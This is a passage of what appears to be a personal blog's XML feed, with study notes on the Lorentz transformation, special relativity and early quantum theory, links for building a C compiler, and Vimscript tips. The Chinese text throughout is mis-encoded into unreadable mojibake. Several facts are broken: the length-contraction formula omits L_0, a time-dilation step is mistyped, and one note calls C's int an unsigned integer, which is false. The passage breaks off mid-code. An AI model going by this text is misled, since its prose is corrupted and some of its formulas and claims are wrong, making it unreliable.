\frac{-v}{c^2} \cdot x + t }{\sqrt{1 - \frac{v^2}{c^2}}}<br>\end{cases} }<br>$$</p></blockquote><blockquote><p>é€†å˜æ¢<br>$$<br>\displaylines{<br>\begin{cases}<br>x &#x3D; \frac{x^\prime - vt^\prime}{\sqrt{1 - \frac{v^2}{c^2}}} \newline~ \newline<br>y &#x3D; y^\prime \newline~ \newline<br>z &#x3D; z^\prime \newline~ \newline<br>t &#x3D; \frac{ \frac{-v}{c^2} \cdot x^\prime + t^\prime }{\sqrt{1 - \frac{v^2}{c^2}}}<br>\end{cases} }<br>$$</p></blockquote><h1 id="åº”ç”¨"><a href="#åº”ç”¨" class="headerlink" title="åº”ç”¨"></a>åº”ç”¨</h1><p>å¯ä»¥ç”¨æ´›ä¼¦å…¹å˜æ¢æ¨å¯¼å‡º:</p><ul><li>è¿åŠ¨ç‰©ä½“å˜çŸ­</li><li>æ—¶é—´è†¨èƒ€</li></ul><p>ç­‰.</p>]]></content>
    
    
    <categories>
      
      <category>Physics</category>
      
    </categories>
    
    
  </entry>
  
  
  
  <entry>
    <title>æ„å»º-C-è¯­è¨€ç¼–è¯‘å™¨-Notes</title>
    <link href="/2022/12/07/%E6%9E%84%E5%BB%BA-C-%E8%AF%AD%E8%A8%80%E7%BC%96%E8%AF%91%E5%99%A8-Notes/"/>
    <url>/2022/12/07/%E6%9E%84%E5%BB%BA-C-%E8%AF%AD%E8%A8%80%E7%BC%96%E8%AF%91%E5%99%A8-Notes/</url>
    
    <content type="html"><![CDATA[<p><a href="https://lotabout.me/2015/write-a-C-interpreter-0/">æ•™ç¨‹åœ°å€ æ‰‹æŠŠæ‰‹æ•™ä½ æ„å»º C è¯­è¨€ç¼–è¯‘å™¨</a></p><p><a href="https://compilers.iecc.com/crenshaw/">èµ„æ–™1 Letâ€™s Build a Compiler</a></p><p><a href="http://www.hwaci.com/sw/lemon/">èµ„æ–™2 Lemon Parser Genenrator</a></p><p><a href="https://github.com/rswier/c4">c4 ç¼–è¯‘å™¨ github åœ°å€</a></p><p><a href="https://github.com/lotabout/write-a-C-interpreter">c4 é‡å†™ç‰ˆç¼–è¯‘å™¨ github åœ°å€</a></p><h1 id="1-è®¾è®¡"><a href="#1-è®¾è®¡" class="headerlink" title="1 è®¾è®¡"></a>1 è®¾è®¡</h1><ul><li>è§£é‡Šå™¨å’Œç¼–è¯‘å™¨ä»…åœ¨ä»£ç ç”Ÿæˆé˜¶æ®µæœ‰åŒºåˆ«ï¼Œè€Œå…¶ä»–æ–¹é¢å¦‚è¯æ³•åˆ†æï¼Œè¯­æ³•åˆ†ææ˜¯ä¸€æ ·çš„.</li><li>è§£é‡Šå™¨éœ€è¦æˆ‘ä»¬å®ç°è‡ªå·±çš„è™šæ‹Ÿæœºä¸æŒ‡ä»¤é›†</li></ul><p>ä¸€èˆ¬è€Œè¨€ï¼Œç¼–è¯‘å™¨çš„ç¼–å†™åˆ† 3 ä¸ªæ­¥éª¤:</p><ol><li><mark>è¯æ³•åˆ†æå™¨</mark>, ç”¨äºå°†å­—ç¬¦ä¸²è½¬åŒ–æˆå†…éƒ¨çš„è¡¨ç¤ºç»“æ„</li><li><mark>è¯­æ³•åˆ†æå™¨</mark>, å°†è¯æ³•åˆ†æå¾—åˆ°çš„æ ‡è®°æµ (token) ç”Ÿæˆä¸€é¢—è¯­æ³•æ ‘</li><li><mark>ç›®æ ‡ä»£ç çš„ç”Ÿæˆ</mark>, å°†è¯­æ³•æ ‘è½¬æ¢æˆç›®æ ‡ä»£ç </li></ol><h1 id="2-è™šæ‹Ÿæœº"><a href="#2-è™šæ‹Ÿæœº" class="headerlink" title="2 è™šæ‹Ÿæœº"></a>2 è™šæ‹Ÿæœº</h1><p><img src="/../img/position_of_some_segments_in_memory.png"></p><p><code>int</code> ç†è§£èµ·æ¥å°±æ˜¯æ— ç¬¦å·çš„æ•´å‹.</p>]]></content>
    
    
    <categories>
      
      <category>Compiler Theory</category>
      
    </categories>
    
    
  </entry>
  
  
  
  <entry>
    <title>Vim-çš„-debug-æ¨¡å¼</title>
    <link href="/2022/12/06/Vim-%E7%9A%84-debug-%E6%A8%A1%E5%BC%8F/"/>
    <url>/2022/12/06/Vim-%E7%9A%84-debug-%E6%A8%A1%E5%BC%8F/</url>
    
    <content type="html"><![CDATA[<p><a href="https://blog.csdn.net/SteveForever/article/details/124896772">å‚è€ƒ1</a></p>]]></content>
    
    
    <categories>
      
      <category>Vim</category>
      
    </categories>
    
    
  </entry>
  
  
  
  <entry>
    <title>ç›¸å¯¹è®ºå’Œé‡å­åŠ›å­¦</title>
    <link href="/2022/12/06/%E7%9B%B8%E5%AF%B9%E8%AE%BA%E5%92%8C%E9%87%8F%E5%AD%90%E5%8A%9B%E5%AD%A6/"/>
    <url>/2022/12/06/%E7%9B%B8%E5%AF%B9%E8%AE%BA%E5%92%8C%E9%87%8F%E5%AD%90%E5%8A%9B%E5%AD%A6/</url>
    
    <content type="html"><![CDATA[<h1 id="é‡å­åŠ›å­¦å’Œç›¸å¯¹è®ºçš„å¼€ç«¯"><a href="#é‡å­åŠ›å­¦å’Œç›¸å¯¹è®ºçš„å¼€ç«¯" class="headerlink" title="é‡å­åŠ›å­¦å’Œç›¸å¯¹è®ºçš„å¼€ç«¯"></a>é‡å­åŠ›å­¦å’Œç›¸å¯¹è®ºçš„å¼€ç«¯</h1><p><a href="https://www.bilibili.com/video/BV1zs41177MP/?spm_id_from=333.880.my_history.page.click&vd_source=bc8ddbb1a08707dc809c3fd9bb85290d">å‚è€ƒ B ç«™</a></p><p>å¼€å°”æ–‡çˆµå£«æå‡ºä¸¤æœµä¹Œäº‘:</p><ul><li>é»‘ä½“è¾å°„ â€“&gt; é‡å­åŠ›å­¦</li><li>è¿ˆå…‹å°”å­™å®éªŒ â€“&gt; ç›¸å¯¹è®º</li></ul><p>é»‘ä½“: åªå¸æ”¶å’Œè¾å°„ç”µç£æ³¢ï¼Œä½†æ˜¯ä¸åå°„.</p><p><img src="/../img/blank_body_regulation.png"></p><p>ç‘åˆ©å’Œé‡‘æ–¯åˆ©ç”¨ç»å…¸ç”µåŠ¨åŠ›å­¦æ¨å¯¼å‡ºçš„ â€œç‘åˆ©-é‡‘æ–¯å…¬å¼â€, å’Œé»‘ä½“è¾å°„å˜åŒ–å›¾åƒä¸ç¬¦ï¼Œè¿™é‡ŒåŒæ—¶å‡ºç°äº† â€“ â€œç´«å¤–ç¾éš¾â€</p><p>æ™®æœ—å…‹ï¼Œå¼•å…¥å‡è®¾ï¼ŒæŒ¯åŠ¨çš„å¸¦ç”µç²’å­ï¼Œèƒ½é‡ä¸æ˜¯è¿ç»­çš„ï¼Œèƒ½é‡æ˜¯ä¸€ä»½ä¸€ä»½çš„ï¼Œå…¶èƒ½é‡è¡¨ç¤ºä¸º:<br>$$<br>\displaylines{\epsilon &#x3D; hv}<br>$$<br>$\epsilon$ æ˜¯æŒ¯åŠ¨å¸¦ç”µç²’å­çš„èƒ½é‡, $h$ æ˜¯æ™®æœ—å…‹å¸¸æ•°, $v$ æ˜¯æŒ¯åŠ¨çš„é¢‘ç‡.</p><p>è€Œè¿™ä¸€ä»½èƒ½é‡å°±è¢«ç§°ä¸º <mark>èƒ½é‡å­</mark>, å³é‡å­. åŒæ—¶å®Œç¾è§£é‡Šäº†é»‘ä½“è¾å°„é—®é¢˜.</p><p>çˆ±å› æ–¯å¦è§£é‡Šå…‰ç”µæ•ˆåº”, å…‰ç…§å°„é‡‘å±æ¿ï¼Œé‡‘å±æ¿é‡Šæ”¾ç”µå­ï¼Œå…¶å¾ˆå¤šç»“è®ºç”¨ä¼ ç»Ÿç†è®ºæ— æ³•è§£é‡Šï¼Œå¦‚èƒ½ä¸èƒ½å‘å°„ç”µå­æ˜¯è·Ÿé¢‘ç‡æœ‰å…³ï¼Œè€Œä¼ ç»Ÿç†è®ºè®¤ä¸ºå…‰çš„èƒ½é‡ç”±å…‰å¼ºå†³å®šï¼Œä¸æ˜¯é¢‘ç‡å†³å®š.</p><p>çˆ±å› æ–¯å¦å¼•ç”¨æ™®æœ—å…‹çš„ç†å¿µï¼Œè®¤ä¸ºå…‰ä¹Ÿæ˜¯ä¸€ä»½ä¸€ä»½çš„ï¼Œæ¯ä¸€ä»½ç§°ä¸ºå…‰å­ï¼Œæ¯ä¸€ä¸ªå…‰å­çš„èƒ½é‡ä¹Ÿæ˜¯æ™®æœ—å…‹å¸¸é‡ä¹˜ä»¥å…‰çš„é¢‘ç‡, é€šè¿‡è¿™ç§æ–¹æ³•ï¼Œçˆ±å› æ–¯å¦è§£é‡Šäº†å…‰ç”µæ•ˆåº”.</p><p>ä»–è¯´æ—¢ç„¶å…‰æœ¬èº«å…·æœ‰æ³¢åŠ¨æ€§ç”µç£æ³¢ï¼ŒåŒæ—¶å®ƒè¿˜å…·æœ‰ç²’å­æ€§. äºæ˜¯çˆ±å› æ–¯å¦è¯´å…‰å…·æœ‰æ³¢ç²’äºŒè±¡æ€§.</p><h1 id="ç‹­ä¹‰ç›¸å¯¹è®º"><a href="#ç‹­ä¹‰ç›¸å¯¹è®º" class="headerlink" title="ç‹­ä¹‰ç›¸å¯¹è®º"></a>ç‹­ä¹‰ç›¸å¯¹è®º</h1><p><a href="https://www.bilibili.com/video/BV1es411P7tc/?spm_id_from=333.999.0.0&vd_source=bc8ddbb1a08707dc809c3fd9bb85290d">å‚è€ƒ</a></p><p>ç›¸å¯¹è®ºä¸»è¦è®²ä»ä¸¤ä¸ªå‚è€ƒç³»æ¥è§‚å¯Ÿç‰©ä½“:</p><ul><li>ç‰©ä½“æœ¬èº«ä½œä¸ºä¸€ä¸ªå‚è€ƒç³»</li><li>åœ°é¢å‚è€ƒç³»</li></ul><p>çˆ±å› æ–¯å¦çš„ä¸¤ä¸ªåŸºæœ¬å‡è®¾ (ç‹­ä¹‰ç›¸å¯¹è®ºçš„ä¸¤ä¸ªåŸºæœ¬å‡è®¾):</p><ul><li>ç›¸å¯¹æ€§åŸç†, ç‰©ç†è§„å¾‹åœ¨ä¸åŒçš„æƒ¯æ€§å‚è€ƒç³»ä¸‹ï¼Œå…·æœ‰ç›¸åŒçš„å½¢å¼ (æƒ¯æ€§å‚è€ƒç³»æŒ‡é™æ­¢æˆ–åŒ€é€Ÿç›´çº¿è¿åŠ¨çš„å‚è€ƒç³», å½¢å¼ç›¸åŒæŒ‡è¡¨è¾¾å¼ç›¸åŒ)</li><li>å…‰é€Ÿä¸å˜åŸç†, åœ¨çœŸç©ºä¸­ï¼Œä»»ä½•æƒ¯æ€§å‚è€ƒç³»ä¸‹ï¼Œå…‰é€Ÿéƒ½æ˜¯ä¸€æ ·çš„ï¼Œä¸º $3 \times 10^8 m&#x2F;s$</li></ul><blockquote><p>å½¢å¼ç›¸åŒè§£é‡Š:</p></blockquote><p><img src="/../img/same_form_of_physical_principle.png"></p><p>ç«è½¦å‚è€ƒç³»ä¸‹çš„ $s$, $v$ å’Œåœ°é¢å‚è€ƒç³»ä¸‹éƒ½ä¸åŒï¼Œä½†æ˜¯å´ç”¨åŒä¸€ä¸ªè¡¨è¾¾å¼è®¡ç®—.</p><blockquote><p>å…‰é€Ÿä¸å˜ï¼Œä¸åŒå‚è€ƒç³»ä¸‹åŒæ—¶æ€§è¢«ç ´å</p></blockquote><p><img src="/../img/speed_of_light_unchange_break_the_simultaneity.png"></p><p>åœ¨ç«è½¦å‚è€ƒç³»ä¸‹ï¼Œä¸¤æŸå…‰åŒæ—¶åˆ°è¾¾ï¼Œè€Œåœ¨åœ°é¢å‚è€ƒç³»ä¸‹ï¼Œæ²¡æœ‰åŒæ—¶åˆ°è¾¾.</p><blockquote><p>é•¿åº¦æ”¶ç¼©</p></blockquote><p>è¿åŠ¨ç‰©ä½“åœ¨è¿åŠ¨æ–¹å‘ä¸Šé•¿åº¦æ”¶ç¼©. åœ¨é™æ­¢å‚è€ƒç³»ä¸Šè§‚å¯Ÿç‰©ä½“ï¼Œæ˜¯æœ¬å¾é•¿åº¦ $L_0$, åœ¨åœ°é¢å‚è€ƒç³»ä¸Šçœ‹ç‰©ä½“çš„é•¿åº¦ä¸ºéæœ¬å¾é•¿åº¦ $L$, å®ƒä¼šç¼©çŸ­ï¼Œ $u$ æ˜¯ç›¸å¯¹é€Ÿåº¦:<br>$$<br>\displaylines{L &#x3D; \sqrt{ 1 - ( \frac{u}{c} )^2 }}<br>$$</p><p>å¯ä»¥çœ‹å‡ºï¼Œç›¸å¯¹é€Ÿåº¦è¶Šå¤§ï¼Œé•¿åº¦ $L$ å°±è¶Šå°.</p><blockquote><p>é•¿åº¦æ”¶ç¼©å¼•å‘çš„æ‚–è®º â€“ ç«è½¦éš§é“æ‚–è®º</p></blockquote><p><img src="/../img/train_tunnel_paradox.png"><br>æœ‰ä¸€ä¸ªç«è½¦å’Œä¸€ä¸ªéš§é“ï¼Œè¿™ä¸ªç«è½¦å’Œéš§é“éƒ½æ˜¯å®Œå…¨ä¸€æ ·é•¿çš„ï¼Œæœ¬å¾é•¿åº¦éƒ½æ˜¯ $L_0$, é‚£ä¹ˆå¦‚æœç«è½¦è¿åŠ¨ç€å¼€è¿‡äº†éš§é“ï¼Œè°ä¼šå˜çŸ­?</p><p>(ä¼¼ä¹ä»¥è°ä¸ºå‚è€ƒç³», è°çš„é•¿åº¦å°±ä¸å˜, ä¸ºæœ¬å¾é•¿åº¦)</p><p>ä»éš§é“çœ‹æ¥ï¼Œéš§é“è¿˜æ˜¯ $L_0$ é•¿ï¼Œç«è½¦å˜çŸ­äº†</p><p>ä»ç«è½¦çœ‹æ¥ï¼Œç«è½¦è¿˜æ˜¯ $L_0$ é•¿ï¼Œéš§é“ç¼©çŸ­äº†</p><p>è§£é‡Šä¸ºï¼Œåœ¨éš§é“çœ‹æ¥åŒæ—¶å‘ç”Ÿçš„äº‹ï¼Œåœ¨ç«è½¦çœ‹æ¥ä¸æ˜¯åŒæ—¶å‘ç”Ÿçš„ã€‚</p><h1 id="ç‹­ä¹‰ç›¸å¯¹è®ºï¼Œæ—¶é—´è†¨èƒ€"><a href="#ç‹­ä¹‰ç›¸å¯¹è®ºï¼Œæ—¶é—´è†¨èƒ€" class="headerlink" title="ç‹­ä¹‰ç›¸å¯¹è®ºï¼Œæ—¶é—´è†¨èƒ€"></a>ç‹­ä¹‰ç›¸å¯¹è®ºï¼Œæ—¶é—´è†¨èƒ€</h1><p><a href="https://www.bilibili.com/video/BV1fs411P7Wx/?spm_id_from=333.999.0.0&vd_source=bc8ddbb1a08707dc809c3fd9bb85290d">å‚è€ƒ B ç«™</a></p><p><img src="/../img/time_dilation.png"></p><p>æ—¶é—´è†¨èƒ€ï¼Œæ„æ€æ˜¯ï¼Œè¿åŠ¨çš„ç‰©ä½“çš„æ—¶é—´ä¼šå˜æ…¢. å¦‚ï¼Œè¿åŠ¨çš„ç‰©ä½“ï¼Œå®ƒè®¤ä¸ºè¿‡äº†ä¸€åˆ†é’Ÿï¼Œåœ°é¢ä¸Šçš„äººè®¤ä¸ºè¿‡äº†ååˆ†é’Ÿ.</p><p>ä¸€åˆ—ç«è½¦å‘å³è¿åŠ¨ï¼Œç«è½¦ä¸Šä¸€å¤„ï¼Œå‘ä¸Šå‘å°„ä¸€æŸå…‰ï¼Œé‡åˆ°é¡¶éƒ¨ååå¼¹.</p><blockquote><p>åœ¨ç«è½¦å‚è€ƒç³»ä¸‹çœ‹ï¼Œå…‰çš„å‡ºå‘ç‚¹å’Œè½åœ°ç‚¹æ˜¯åŒä¸€ä¸ªç‚¹ï¼Œå…¶ç»è¿‡çš„æ—¶é—´ä¸º:</p></blockquote><p>$$<br>\displaylines{t_0 &#x3D; \frac{2s}{c}}<br>$$</p><p>$t_0$ ä¸ºæœ¬å¾æ—¶é—´. ( $s$ ä¸ºä¸Šä¸‹çš„è·ç¦», $c$ ä¸ºå…‰é€Ÿ)</p><blockquote><p>åœ¨åœ°é¢å‚è€ƒç³»ä¸‹çœ‹ï¼Œå…‰çš„å‡ºå‘ç‚¹å’Œè½åœ°ç‚¹æ˜¯ä¸åŒç‚¹, æ­¤æ—¶æ±‚å¾—çš„æ—¶é—´ä¸ºéæœ¬å¾æ—¶é—´, è®¡ç®—ä¸º:</p></blockquote><p>$$<br>\displaylines{t &#x3D; \frac{2s}{\sqrt{c^2 - v^2}}}<br>$$</p><p>$c$ æ˜¯å…‰é€Ÿ, $v$ æ˜¯æ°´å¹³é€Ÿåº¦åˆ†é‡ (ä¸ºäº†å’Œç«è½¦ç›¸å¯¹é™æ­¢è¿åŠ¨)</p><p>æ—¶é—´è†¨èƒ€å°±æ˜¯æŒ‡:</p><p>$$<br>\displaylines{ \frac{t_0}{t} &#x3D; \frac{\sqrt{c^2 - v^2}}{c} &#x3D; \sqrt{1 - ( \frac{v}{c}^2 )} &lt; 1}<br>$$</p><p>å³æœ¬å¾æ—¶é—´å°äºéæœ¬å¾æ—¶é—´ï¼Œå³æ—¶é—´è†¨èƒ€. (è§‚å¯Ÿè€…ä½äºåœ°é¢å‚è€ƒç³», è§‚å¯Ÿè€…è§‚å¯Ÿåˆ°çš„æ—¶é—´å¤§äºè¿åŠ¨è€…è®¤ä¸ºçš„æ—¶é—´)</p><blockquote><p>æ—¶é—´è†¨èƒ€å…¬å¼</p></blockquote><p>$$<br>\displaylines{ t &#x3D; \frac{t_0}{\sqrt{ 1 - ( \frac{v}{c} )^2 }} }<br>$$</p><p>è¿™é‡Œçš„ $t$ å°±æ˜¯è§‚å¯Ÿè€…è§‚å¯Ÿçš„æ—¶é—´.</p><blockquote><p>åŒç”Ÿå­ä½¯è°¬</p></blockquote><p>å½“ä¸€ä¸ªç‰©ä½“å‡ºç°å˜é€Ÿè¿‡ç¨‹æ—¶ï¼Œä¸èƒ½ç”¨ç‹­ä¹‰ç›¸å¯¹è®ºæ±‚è§£ï¼Œå¿…é¡»ç”¨å¹¿ä¹‰ç›¸å¯¹è®ºæ±‚è§£.</p>]]></content>
    
    
    <categories>
      
      <category>Physics</category>
      
    </categories>
    
    
  </entry>
  
  
  
  <entry>
    <title>Vimscript-æŠ€å·§ç§¯ç´¯</title>
    <link href="/2022/12/06/Vimscript-%E6%8A%80%E5%B7%A7%E7%A7%AF%E7%B4%AF/"/>
    <url>/2022/12/06/Vimscript-%E6%8A%80%E5%B7%A7%E7%A7%AF%E7%B4%AF/</url>
    
    <content type="html"><![CDATA[<h1 id="åº”ç”¨æ­£åˆ™è¡¨è¾¾å¼"><a href="#åº”ç”¨æ­£åˆ™è¡¨è¾¾å¼" class="headerlink" title="åº”ç”¨æ­£åˆ™è¡¨è¾¾å¼"></a>åº”ç”¨æ­£åˆ™è¡¨è¾¾å¼</h1><p><a href="https://stackoverflow.com/questions/3135322/regex-in-vimscript">å‚è€ƒ</a></p><p>ä½¿ç”¨ <code>match()</code>, <code>matchstr()</code> ç­‰å‡½æ•°.</p><h1 id="å…‰æ ‡çš„ä½ç½®"><a href="#å…‰æ ‡çš„ä½ç½®" class="headerlink" title="å…‰æ ‡çš„ä½ç½®"></a>å…‰æ ‡çš„ä½ç½®</h1><p>ä½¿ç”¨ <code>getcurpos()</code>.</p><h1 id="ç”¨-Vimscript-æ’å…¥æ–‡æœ¬"><a href="#ç”¨-Vimscript-æ’å…¥æ–‡æœ¬" class="headerlink" title="ç”¨ Vimscript æ’å…¥æ–‡æœ¬"></a>ç”¨ Vimscript æ’å…¥æ–‡æœ¬</h1><p>ç»“åˆ <code>execute</code>, <code>normal</code> å‘½ä»¤, å¦‚:</p><figure class="highlight vim"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs vim"><span class="hljs-keyword">let</span> <span class="hljs-variable">l:text</span> = <span class="hljs-string">&quot;Hello World&quot;</span><br><span class="hljs-keyword">execute</span> <span class="hljs-string">&quot;normal! a&quot;</span> . <span class="hljs-variable">l:text</span><br></code></pre></td></tr></table></figure><h1 id="å°†ä¸€ä¸ªå­—ç¬¦ä¸²é‡å¤-N-æ¬¡"><a href="#å°†ä¸€ä¸ªå­—ç¬¦ä¸²é‡å¤-N-æ¬¡" class="headerlink" title="å°†ä¸€ä¸ªå­—ç¬¦ä¸²é‡å¤ N æ¬¡"></a>å°†ä¸€ä¸ªå­—ç¬¦ä¸²é‡å¤ N æ¬¡</h1><p><a href="https://vi.stackexchange.com/questions/14385/vimscript-how-to-repeat-a-string-n-times">å‚è€ƒ</a></p><p>ä½¿ç”¨ <code>repeat()</code>, å¦‚:</p><figure class="highlight vim"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs vim"><span class="hljs-keyword">let</span> foo = <span class="hljs-built_in">repeat</span>(<span class="hljs-string">&quot;abc&quot;</span>, <span class="hljs-number">3</span>)<br></code></pre></td></tr></table></figure><h1 id="ä½¿ç”¨æ­£åˆ™è¡¨è¾¾å¼çš„æ•è·"><a href="#ä½¿ç”¨æ­£åˆ™è¡¨è¾¾å¼çš„æ•è·" class="headerlink" title="ä½¿ç”¨æ­£åˆ™è¡¨è¾¾å¼çš„æ•è·"></a>ä½¿ç”¨æ­£åˆ™è¡¨è¾¾å¼çš„æ•è·</h1><p>å¦‚:</p><figure class="highlight vim"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs vim">:%s/\(test\)/\<span class="hljs-number">1</span>/ <br></code></pre></td></tr></table></figure><p>æ•è·ç”¨çš„æ‹¬å·éœ€è¦è½¬ä¹‰ä¸º <code>\( \)</code>.</p><h1 id="å¯¹ä¸€ä¸ªå˜é‡ä½¿ç”¨-substitute"><a href="#å¯¹ä¸€ä¸ªå˜é‡ä½¿ç”¨-substitute" class="headerlink" title="å¯¹ä¸€ä¸ªå˜é‡ä½¿ç”¨ substitute"></a>å¯¹ä¸€ä¸ªå˜é‡ä½¿ç”¨ substitute</h1><p><a href="https://stackoverflow.com/questions/4864073/using-substitute-on-a-variable">å‚è€ƒ</a></p><p>ä½¿ç”¨ <code>substitute()</code>, å…·ä½“çœ‹ <code>:h substitute()</code>.</p><p>è¿™é‡Œé¢çš„æ•è·å‹è¦å†™æˆ <code>\\1</code></p><h1 id="ç¼–å†™ç»Ÿè®¡æ±‰å­—"><a href="#ç¼–å†™ç»Ÿè®¡æ±‰å­—" class="headerlink" title="ç¼–å†™ç»Ÿè®¡æ±‰å­—"></a>ç¼–å†™ç»Ÿè®¡æ±‰å­—</h1><h2 id="å°†ä¸€ä¸²å­—ç¬¦åˆ†éš”ä¸ºä¸€ä¸ªä¸€ä¸ªçš„å­—ç¬¦"><a href="#å°†ä¸€ä¸²å­—ç¬¦åˆ†éš”ä¸ºä¸€ä¸ªä¸€ä¸ªçš„å­—ç¬¦" class="headerlink" title="å°†ä¸€ä¸²å­—ç¬¦åˆ†éš”ä¸ºä¸€ä¸ªä¸€ä¸ªçš„å­—ç¬¦"></a>å°†ä¸€ä¸²å­—ç¬¦åˆ†éš”ä¸ºä¸€ä¸ªä¸€ä¸ªçš„å­—ç¬¦</h2><figure class="highlight vim"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs vim"><span class="hljs-keyword">split</span>(<span class="hljs-built_in">string</span>, <span class="hljs-string">&#x27;\zs&#x27;</span>)<br></code></pre></td></tr></table></figure><p>å…¶è¿”å›å€¼æ˜¯åˆ—è¡¨, æ¯ä¸€ä¸ªå…ƒç´ æ˜¯ä¸€ä¸ªå­—ç¬¦.</p><h2 id="æ±‚ä¸€ä¸ªå­—ç¬¦çš„-utf-8-çš„-number"><a href="#æ±‚ä¸€ä¸ªå­—ç¬¦çš„-utf-8-çš„-number" class="headerlink" title="æ±‚ä¸€ä¸ªå­—ç¬¦çš„ utf-8 çš„ number"></a>æ±‚ä¸€ä¸ªå­—ç¬¦çš„ utf-8 çš„ number</h2><figure class="highlight vim"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs vim"><span class="hljs-built_in">char2nr</span>(char)<br></code></pre></td></tr></table></figure><p>å…¶è¿”å›å€¼æ˜¯ä¸€ä¸ªæ•°å­—.</p><h2 id="æ€»æµç¨‹"><a href="#æ€»æµç¨‹" class="headerlink" title="æ€»æµç¨‹"></a>æ€»æµç¨‹</h2><figure class="highlight vim"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs vim"><span class="hljs-keyword">for</span> char in <span class="hljs-keyword">split</span>(text, <span class="hljs-string">&#x27;\zs&#x27;</span>)<br>    <span class="hljs-keyword">if</span> <span class="hljs-built_in">char2nr</span>(char) &gt;= <span class="hljs-number">0</span>x2000<br>        <span class="hljs-keyword">let</span> <span class="hljs-keyword">cc</span> += <span class="hljs-number">1</span><br>    <span class="hljs-keyword">endif</span><br><span class="hljs-keyword">endfor</span><br></code></pre></td></tr></table></figure><p>è¿™é‡Œå®šä¹‰ unicode å¤§äº <code>0x2000</code> çš„ä¸ºæ±‰å­—.</p><h1 id="è·å¾—ä¸€ä¸ªç›®å½•ä¸‹çš„æ‰€æœ‰æ–‡ä»¶"><a href="#è·å¾—ä¸€ä¸ªç›®å½•ä¸‹çš„æ‰€æœ‰æ–‡ä»¶" class="headerlink" title="è·å¾—ä¸€ä¸ªç›®å½•ä¸‹çš„æ‰€æœ‰æ–‡ä»¶"></a>è·å¾—ä¸€ä¸ªç›®å½•ä¸‹çš„æ‰€æœ‰æ–‡ä»¶</h1><p>ä½¿ç”¨ <code>globpath()</code> å‡½æ•°ã€‚æ³¨æ„è¯¥å‡½æ•°è¿”å›çš„æ˜¯ string è€Œä¸æ˜¯ list.</p><p>å¦‚è·å¾—å½“å‰ç›®å½•ä¸‹çš„æ‰€æœ‰æ–‡ä»¶:</p><figure class="highlight vim"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs vim"><span class="hljs-keyword">let</span> <span class="hljs-keyword">list</span> = <span class="hljs-keyword">split</span>(<span class="hljs-built_in">globpath</span>(<span class="hljs-string">&#x27;.&#x27;</span>, <span class="hljs-string">&#x27;*&#x27;</span>), <span class="hljs-string">&#x27;\n&#x27;</span>)<br></code></pre></td></tr></table></figure><p>ä¸”ä¸ºå…¨è·¯å¾„.</p><h1 id="å…³äº-normal-d"><a href="#å…³äº-normal-d" class="headerlink" title="å…³äº normal d"></a>å…³äº normal d</h1><p>å•çº¯çš„:</p><figure class="highlight vim"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs vim">exec <span class="hljs-string">&#x27;normal d&#x27;</span><br></code></pre></td></tr></table></figure><p>å¹¶ä¸ä¼šåˆ é™¤æ–‡æœ¬ï¼Œåªæ˜¯å°†å…¶å‰ªåˆ‡åˆ° <code>&quot;</code> å¯„å­˜å™¨ä¸­ï¼Œéœ€è¦åˆ é™¤æ–‡æœ¬ï¼Œç”¨:</p><figure class="highlight vim"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs vim">exec <span class="hljs-string">&#x27;normal gvd&#x27;</span><br></code></pre></td></tr></table></figure><h1 id="ç”¨-source-å‘½ä»¤åŠ è½½ä¸€ä¸ªå­˜å‚¨åœ¨å˜é‡ä¸­çš„æ–‡ä»¶å"><a href="#ç”¨-source-å‘½ä»¤åŠ è½½ä¸€ä¸ªå­˜å‚¨åœ¨å˜é‡ä¸­çš„æ–‡ä»¶å" class="headerlink" title="ç”¨ source å‘½ä»¤åŠ è½½ä¸€ä¸ªå­˜å‚¨åœ¨å˜é‡ä¸­çš„æ–‡ä»¶å"></a>ç”¨ source å‘½ä»¤åŠ è½½ä¸€ä¸ªå­˜å‚¨åœ¨å˜é‡ä¸­çš„æ–‡ä»¶å</h1><p><a href="https://vi.stackexchange.com/questions/36512/how-to-source-a-path-stored-in-a-variable-in-vimscript">å‚è€ƒç½‘é¡µ</a></p><p>ç»“åˆ <code>exec</code> å‘½ä»¤å’Œ <code>expand()</code> å‡½æ•°, å¦‚:</p><figure class="highlight vim"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs vim"><span class="hljs-keyword">let</span> mypath = <span class="hljs-string">&#x27;/tmp/&#x27;</span><br>exec <span class="hljs-string">&quot;source &quot;</span> . <span class="hljs-built_in">expand</span>(mypath) . <span class="hljs-string">&quot;test.vim&quot;</span><br></code></pre></td></tr></table></figure><p>å³å¯.</p><h1 id="å…³äºå‡½æ•°çš„å‚æ•°"><a href="#å…³äºå‡½æ•°çš„å‚æ•°" class="headerlink" title="å…³äºå‡½æ•°çš„å‚æ•°"></a>å…³äºå‡½æ•°çš„å‚æ•°</h1><p>ä½¿ç”¨å¦‚:</p><figure class="highlight vim"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs vim"><span class="hljs-keyword">let</span> mypath = <span class="hljs-string">&#x27;/tmp/&#x27;</span><br><br><span class="hljs-keyword">function</span> <span class="hljs-title">LoadFile</span><span class="hljs-params">(path, file)</span> abort<br>    <span class="hljs-keyword">execute</span> <span class="hljs-string">&quot;source &quot;</span> . <span class="hljs-built_in">expand</span>(<span class="hljs-variable">a:path</span>) . <span class="hljs-built_in">expand</span>(<span class="hljs-variable">a:file</span>)<br><span class="hljs-keyword">endfunction</span><br><br><span class="hljs-keyword">call</span> LoadFile(mypath, <span 